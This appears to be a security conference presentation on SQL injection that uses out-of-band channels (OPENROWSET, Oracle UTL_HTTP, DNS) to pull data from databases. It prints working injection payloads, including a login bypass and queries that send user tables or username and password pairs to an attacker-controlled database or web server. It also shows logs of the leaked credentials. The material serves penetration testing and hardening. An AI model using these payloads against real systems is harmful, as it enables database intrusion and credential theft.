# SQL Injection and Out-of-Band (OOB) Channels
## Presenter: Patrik Karlsson, Inspect it
For the latest version of this presentation, visit [http://www.inspectit.se/dc15.html](http://www.inspectit.se/dc15.html).

### Introduction
- **Who am I?**
  - **Patrik Karlsson**
  - Information Security Consultant
  - Owner of Inspect it
  - Founder of cqure.net

- **What do I do?**
  - Penetration Testing
  - Application Security Reviews
  - Source Code Audits
  - General Information Security Audits

- **What am I presenting?**
  - A discussion on SQL injection, with a focus on out-of-band (OOB) channeling.
  - Several examples demonstrating the use of this technique.

- **Why?**
  - Despite increased awareness, many applications remain vulnerable to SQL injection.
  - Exploring OOB channels can be an interesting and effective way to tunnel data.

- **What am I not presenting?**
  - The basics of SQL injection.
  - A comprehensive list of tools for automatic scanning or hacking web applications.
  - A one-size-fits-all solution to all SQL injection problems.

### A Brief Recap of SQL Injection
- **Definition:**
  - SQL injection is a high-risk security vulnerability.
  - It allows attackers to inject arbitrary SQL code through poorly validated application parameters.
  - This occurs due to inadequate design and input validation controls.
  - Consequences can range from minor issues to severe data breaches, depending on the attacker's privileges and the system's patch level.
  - Any source code variable containing user-provided data (e.g., form inputs, URL parameters, cookies, referrer, user-agent) could be vulnerable.

- **Example:**
  ```sql
  sql = "SELECT usr_id FROM tbl_users WHERE usr_name = '" + sUser + "' AND usr_pass='" + sPass + "'";
  ```
  - If the user supplies the password `' OR 1=1 --'`, the query becomes:
  ```sql
  SELECT usr_id FROM tbl_users WHERE usr_name = 'username' AND usr_pass='' OR 1=1 --
  ```
  - This results in the condition always being true, potentially exposing all user IDs.

### Out-of-Band (OOB) Channels
- **Introduction:**
  - OOB channels exploit traditional SQL injection weaknesses but use alternative communication channels to return data.
  - These channels can include timing, HTTP, and DNS.
  - Different approaches exist, depending on the backend database.

- **When OOB Channels are Useful:**
  - When detailed error messages are disabled.
  - When control is gained late in a query.
  - When a second query (batching) can be injected.
  - When results are limited or filtered.
  - When outbound firewall rules are lax.
  - When reducing the number of queries is important.
  - When blind SQL injection seems to be the only option.

- **Example Scenarios:**
  - Consider enumerating information from the following vulnerable code (x marks user input):
    ```sql
    SELECT topic FROM news ORDER BY x;
    EXEC sp_logon @name='admin', @pass='x';
    SELECT TOP 1 id FROM t WHERE name='x';
    ```

- **Channel Suitability:**
  - The suitability of a channel depends on various factors.
  - Three approaches will be discussed, along with their limitations:
    1. **Channeling Data Using OPENROWSET:**
       - Available in Microsoft SQL Server.
       - Allows data retrieval from an alternate data provider.
       - Can be used with `UNION` to merge datasets.
       - Disabled by default in MSSQL 2005.
       - **Syntax:**
         ```sql
         OPENROWSET 
         ( { 'provider_name' , { 'datasource' ; 'user_id' ; 'password' 
           | 'provider_string' }
           , { [ catalog. ] [ schema. ] object 
           | 'query' 
           }
           | BULK 'data_file' ,
           { FORMATFILE = 'format_file_path' 
           [ ]
           | SINGLE_BLOB | SINGLE_CLOB | SINGLE_NCLOB }
           } ) 
         ```
       - **Example:**
         ```sql
         ... UNION ALL SELECT a.* FROM 
         OPENROWSET('SQLOLEDB',
         'uid=sa;pwd=;Network=DBMSSOCN;
         Address=10.10.10.10;timeout=1',
         'SELECT user, pass FROM users') 
         AS a--
         ```
       - **Relevance to OOB Channels:**
         - OPENROWSET can be reversed to insert data into a data source.
         - This allows fetching data from one source and inserting it into another.
         - The destination database can be any host reachable from the source.
         - Enables information enumeration through batching statements.
       - **Example:**
         ```sql
         SELECT usr_id FROM tbl_users
         WHERE usr_name = 'patrik' AND 
         usr_pass='secret';INSERT INTO 
         OPENROWSET('SQLOLEDB',
         'uid=haxxor;pwd=31337;
         Network=DBMSSOCN;
         Address=th3.h4xx0r.c0m,443;
         timeout=5','SELECT * FROM users') 
         SELECT * from users --
         ```
       - **Considerations:**
         - **Obstacles:**
           - Destination DB must be reachable from the source DB.
           - Source and destination tables need to be identical.
         - **Solutions:**
           - Use commonly open ports like HTTP(S) and FTP.
           - Utilize `SYSOBJECTS` and `SYSCOLUMNS` for table structure.
       - **Summary:**
         - Still relevant for older databases.
         - Many databases remain unhardened.
         - Firewalls are often less strict outbound.
         - Limited to Microsoft SQL Server.
         - Disabled by default in MS SQL 2005.
         - Requires a direct outbound connection to the attacker's DB.
         - Users need to be members of the sysadmin role in SQL Server SP3 or later.

    2. **Channeling Data Using UTL_HTTP:**
       - UTL_HTTP allows downloading web pages through SQL queries.
       - Example:
         ```sql
         SELECT utl_http.request('http://www.oracle.com/') FROM dual;
         ```
       - Can be exploited as an OOB channel by dynamically building the URL.
       - Retrieved data can be seen in web server log files.
       - **Example:**
         ```sql
         SELECT topic FROM news
         ORDER BY (select 
         utl_http.request('http://www.cq
         ure.net/INJ/'||(select uname || 
         '_' || upass from tbl_logins 
         where rownum<2)||'') from dual)
         ```
       - **Log File Sample:**
         ```
         "GET /inj/ADMIN_NIMDA HTTP/1.1" 200
         "GET /inj/USER_SECRET HTTP/1.1" 200
         "GET /inj/PETER_MARY1 HTTP/1.1" 200 
         "GET /inj/FRED_JANE99 HTTP/1.1" 200 
         "GET /inj/HENRY_CARS1 HTTP/1.1" 200
         "GET /inj/MARY_PETER2 HTTP/1.1" 200
         "GET /inj/JANE_FLOWER HTTP/1.1" 200
         ```
       - **Summary:**
         - Many databases remain unhardened.
         - Firewalls are often less strict outbound.
         - Limited to Oracle RDBMS.
         - Hardening guides suggest disabling.
         - Requires a direct outgoing connection to the attacker's web server.

    3. **Channeling Data Over DNS:**
       - DNS is a hierarchical protocol.
       - If you manage the DNS server for a zone (e.g., cqure.net), you can monitor queries for sub-domains or hosts in that domain.
       - **Why is DNS Interesting?**
         - Even hardened databases often still perform DNS lookups.
         - Internal DNS servers are usually allowed to forward queries.
         - Many hardening guides overlook functions that can initiate DNS queries.
         - This provides an indirect channel to a DNS server of your choice.
         - Triggering DNS resolution allows querying for hosts in your zone.
       - **Summary:**
         - Many databases remain unhardened.
         - Firewalls are often less strict outbound.
         - Limited to specific database configurations.
         - Hardening guides suggest disabling.
         - Requires a direct outgoing connection to the attacker's DNS server.

By exploring these OOB channels, we can gain a deeper understanding of how SQL injection can be leveraged in more complex and subtle ways, even in environments with robust security measures.